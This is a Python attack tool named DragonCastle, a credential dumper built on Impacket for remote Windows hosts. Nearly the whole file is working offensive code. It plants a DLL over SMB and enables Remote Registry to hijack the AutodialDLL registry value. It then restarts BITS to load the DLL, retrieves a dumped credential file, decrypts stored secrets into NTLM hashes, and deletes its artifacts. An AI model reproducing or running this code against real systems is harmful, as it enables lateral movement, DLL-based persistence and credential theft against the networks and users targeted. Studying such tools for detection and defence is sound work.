#!/usr/bin/env python
# DragonCastle - A credential dumper
# Author: Juan Manuel Fernandez (@TheXC3LL)
# Based on:
# https://decoded.avast.io/luigicamastra/operation-dragon-castling-apt-group-targeting-betting-companies/
# https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/
# https://adepts.of0x.cc/physical-graffiti-lsass/
# https://blog.xpnsec.com/exploring-mimikatz-part-2/

import sys
import time
import argparse
import logging
from pyDes import *
from impacket import system_errors
from impacket import version
from impacket.dcerpc.v5 import transport, scmr, rrp
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dtypes import NULL



# From Impacket Utils
def parse_target(target):
    domain, username, password, remote_name = target_regex.match(target).groups('')
    # In case the password contains '@'
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]
    return domain, username, password, remote_name




# The Danger Zone
class autodialpwn():
	def run(self, username, password, domain, lmhash, nthash, doKerberos, dcHost, targetIp, targetDLL, dlllocation):
            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % targetIp
            logging.debug('StringBinding %s' % stringbinding)
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(445)
            rpctransport.setRemoteHost(targetIp)
            if hasattr(rpctransport, 'set_credentials'):
                rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
            if doKerberos:
                rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

            dce = rpctransport.get_dce_rpc()
            print("[+] Connecting to %s" % targetIp)
            try:
                dce.connect()
            except Exception as e:
                logging.critical(str(e))
                sys.exit(1)

            try:
                sambita = rpctransport.get_smb_connection()
                fh = open(targetDLL, 'rb')
                print("[+] Uploading %s to %s" % (targetDLL, dlllocation))
                loc = dlllocation.split(":\\")
                sambita.putFile(loc[0]+"$", loc[1], fh.read)
            except Exception as e:
                logging.critical(str(e))
                sys.exit(1)

            dce.bind(scmr.MSRPC_UUID_SCMR)
            scHandle = scmr.hROpenSCManagerW(dce)
            serviceName = 'RemoteRegistry\x00'
            desiredAccess = scmr.SERVICE_START | scmr.SERVICE_STOP | scmr.SERVICE_CHANGE_CONFIG | scmr.SERVICE_QUERY_CONFIG | scmr.SERVICE_QUERY_STATUS | scmr.SERVICE_ENUMERATE_DEPENDENTS
            resp = scmr.hROpenServiceW(dce, scHandle['lpScHandle'], serviceName, desiredAccess )
            serviceHandle = resp['lpServiceHandle']
            print("[+] Checking Remote Registry service status...")
            resp = scmr.hRQueryServiceStatus(dce, serviceHandle)
            if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
                print("[+] Service is up!")
                stopme = False
            if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
                print("[+] Service is down!")
                stopme = True
            if stopme == True:
                print("[+] Starting Remote Registry service...")
                try:
                   req = scmr.RStartServiceW()
                   req['hService'] = serviceHandle
                   req['argc'] = 0
                   req['argv'] = NULL
                   dce.request(req)
                except Exception as e:
                   if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                      logging.critical(str(e))
                      raise
                   pass
            strb = r'ncacn_np:%s[\pipe\winreg]' % targetIp
            rpc = transport.DCERPCTransportFactory(strb)
            rpc.set_dport(445)
            rpc.setRemoteHost(targetIp)
            if hasattr(rpc, 'set_credentials'):
                rpc.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
            if doKerberos:
                rpc.set_kerberos(doKerberos, kdcHost=dcHost)
            dce2 = rpc.get_dce_rpc()
            print("[+] Connecting to %s" % targetIp)
            try:
                dce2.connect()
            except Exception as e:
                logging.critical(str(e))
                sys.exit(1)
            dce2.bind(rrp.MSRPC_UUID_RRP)
            print("[+] Updating AutodialDLL value")
            ans = rrp.hOpenLocalMachine(dce2)
            resp = rrp.hBaseRegOpenKey(dce2, ans["phKey"], "SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters", samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
            handler = resp["phkResult"]
            resp = rrp.hBaseRegSetValue(dce2, handler, "AutodialDLL", rrp.REG_SZ, dlllocation)
            if stopme == True:
                print("[+] Stopping Remote Registry Service")
                try:
                   req = scmr.RControlService()
                   req['hService'] = serviceHandle
                   req['dwControl'] = scmr.SERVICE_CONTROL_STOP
                   dce.request(req)
                except Exception as e:
                   if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                       logging.critical(str(e))
                       raise
                   pass
            scHandle2 = scmr.hROpenSCManagerW(dce)
            serviceName = 'bits\x00'
            desiredAccess = scmr.SERVICE_START | scmr.SERVICE_STOP | scmr.SERVICE_CHANGE_CONFIG | scmr.SERVICE_QUERY_CONFIG | scmr.SERVICE_QUERY_STATUS | scmr.SERVICE_ENUMERATE_DEPENDENTS
            resp = scmr.hROpenServiceW(dce, scHandle2['lpScHandle'], serviceName, desiredAccess )
            serviceHandle2 = resp['lpServiceHandle']
            print("[+] Checking BITS service status...")
            resp = scmr.hRQueryServiceStatus(dce, serviceHandle2)
            if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
                print("[+] Service is up!")
                stopme = False
            if resp['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
                print("[+] Service is down!")
                stopme = True
            if stopme == False:
                print("[+] Stopping BITS service")
                try:
                    req = scmr.RControlService()
                    req['hService'] = serviceHandle2
                    req['dwControl'] = scmr.SERVICE_CONTROL_STOP
                    dce.request(req)
                except Exception as e:
                    if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                        logging.critical(str(e))
                    raise
                pass
            time.sleep(5)
            print("[+] Starting BITS service")
            try:
               req = scmr.RStartServiceW()
               req['hService'] = serviceHandle2
               req['argc'] = 0
               req['argv'] = NULL
               dce.request(req)
            except Exception as e:
               if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                   logging.critical(str(e))
                   raise
               pass
            time.sleep(10)
            print("[+] Downloading creds")
            fh = open("/tmp/adf", "w+b")
            sambita.getFile('C$', "pwned.txt", fh.write)
            fh.seek(0)
            data = fh.read()
            fh.close()
            if stopme == False:
                print("[+] Stopping BITS service")
                try:
                    req = scmr.RControlService()
                    req['hService'] = serviceHandle2
                    req['dwControl'] = scmr.SERVICE_CONTROL_STOP
                    dce.request(req)
                except Exception as e:
                    if str(e).find('ERROR_DEPENDENT_SERVICES_RUNNING') < 0 and str(e).find('ERROR_SERVICE_NOT_ACTIVE') < 0:
                        logging.critical(str(e))
                    raise
                pass
            print("[+] Deleting credential file")
            sambita.deleteFile("C$", "pwned.txt")
            print("[+] Parsing creds:")
            print("\n\t\t============")
            dump = data.decode("utf-8")
            lines = dump.split("\n")
            for x in lines:
                if "IV" in x:
                    iv = bytearray.fromhex(x.split(":")[1])
                if "3DES" in x:
                    key = bytearray.fromhex(x.split(":")[1])
                if "User" in x:
                    print(x)
                if "Domain:" in x:
                    print(x)
                if "Password:" in x:
                    a = triple_des(key, CBC, b'\x00\x0d\x56\x99\x63\x93\x95\xd0')
                    ntlm = a.decrypt(bytearray.fromhex(x.split(":")[1]))[74:90].hex()
                    print("NTLM: " + ntlm)
                if "----" in x:
                    print(x)
            print("\n\t\t============")
            print("[+] Deleting DLL")
            sambita.deleteFile(loc[0]+"$", loc[1])
            scmr.hRCloseServiceHandle(dce, scHandle2['lpScHandle'])
            scmr.hRCloseServiceHandle(dce, scHandle['lpScHandle'])
           









def main():
    parser = argparse.ArgumentParser(add_help = True, description = "DragonCastle - A credential dumper (@TheXC3LL)")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    parser.add_argument('-local-dll', action='store', metavar='dll to plant', help="DLL location (local) that will be planted on target")
    parser.add_argument('-remote-dll', action='store', metavar='dll location', help="Path used to update AutodialDLL registry value")
    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")
    pwn = autodialpwn()
    pwn.run(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip, targetDLL=options.local_dll, dlllocation=options.remote_dll)


if __name__ == '__main__':
    print("\t\tDragonCastle - @TheXC3LL\n\n")
    main()
    print("\n[^] Have a nice day!")
